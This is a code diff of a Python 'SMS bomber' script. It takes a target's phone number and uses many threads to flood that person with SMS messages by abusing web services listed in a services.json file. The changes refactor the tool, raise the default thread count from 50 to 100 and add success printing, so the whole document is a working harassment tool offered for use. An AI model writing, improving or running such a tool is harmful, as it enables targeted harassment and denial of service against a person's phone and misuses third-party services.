@@ -1,51 +1,35 @@
 #!/usr/bin/env python3
 
-# TODO: country codes for other phone numbers, logging ( --verbose )
+# TODO: PEP8 code style,
+#       country codes for other phone numbers,
+#       logging ( --verbose )
 
 import os
 import json
 import argparse
 import threading
-from time import time, sleep
 from itertools import cycle
-
-try:
-    from randomData import shuffleServices
-    from service import Service
-    import conf.config as cfg
-except ImportError as e:
-    print(e)
-    exit("ImportError: try to install modules:\n" +
-         "pip3 install -r requirements.txt")
+from time import time, sleep
+import conf.config as cfg
+from service import Service
+from randomData import shuffleServices
 
 
-def startBomber(thread_id):
+def startBomber():
     shuffleServices(services)
     for elem in cycle(services):
-        if time() >= stop_time:
+        if time() >= args.time:
             return
         sleep(interval)
-        # Creating obj of service, parse data, replace data and send request:
         service = Service(elem, timeout, proxy)
         service.parse_data()
         service.replace_data(phone)
         try:
-            service._send_request()
+            service.send_request()
+            print('Success - ' + service.domain_name)
         except KeyboardInterrupt:
             threading._shutdown()
 
-
-def cleanPhoneFromTrash(phone):
-    for trash in ["'", '"', "-", "_", "(", ")", " "]:
-        if trash in phone:
-            phone = phone.replace(trash, "")
-    if phone[0] == '+':
-        phone = phone[1::]
-    if phone[0] == '8':
-        phone = '7' + phone[1::]
-    if phone[0] == '9':
-        phone = '7' + phone
-    return phone
 
 
 # Creating parser obj
@@ -57,10 +41,10 @@ parser.add_argument(
     "-p", "--phone", metavar="<phone>",
     help="target's russian phone number, format no matters")
 parser.add_argument(
-    "-t", "--stop_time", metavar="<seconds>",
+    "-t", "--time", metavar="<seconds>",
     type=float, help="bombing time in seconds")
 parser.add_argument(
-    "--threads", default=50, type=int, metavar="<int>",
+    "--threads", default=100, type=int, metavar="<int>",
     help="threads count, more threads = more sms, (default: %(default)s)")
 parser.add_argument(
     "-i", "--interval", default=0, type=float, metavar="<seconds>",
@@ -80,11 +64,23 @@ args = parser.parse_args()
 phone = args.phone
 if not phone:
     phone = input("Enter target's phone number: ")
-phone = cleanPhoneFromTrash(phone)
+for trash in ("'", '"', "-", "_", "(", ")", " "):
+    if trash in phone:
+        phone = phone.replace(trash, "")
+if phone[0] == '+':
+    phone = phone[1::]
+if phone[0] == '8':
+    phone = '7' + phone[1::]
+if phone[0] == '9':
+    phone = '7' + phone
+
 # Bombing time
-if not args.stop_time:
-    args.stop_time = int(input("Enter bombing time in seconds: "))
-stop_time = args.stop_time + time()
+if not args.time:
+    args.time = int(input("Enter bombing time in seconds: "))
+# Doesn't creating "time" var because
+# it is will conflict with "time" func from module "time"
+args.time += time()
+
 # Other args
 threads = args.threads
 interval = args.interval
@@ -98,11 +94,10 @@ with open("services.json", "r") as file:
 
 os.system("clear")
 print(cfg.banner)
-print("Creating %s threads" % threads)
+
 # Creating threads
-for thread_id in range(threads):
-    thread_id += 1
-    threading.Thread(target=startBomber, args=(thread_id, )).start()
+for thread in range(threads):
+    threading.Thread(target=startBomber).start()
 
 # Killing all threads when bombers work is done
 threading._shutdown()
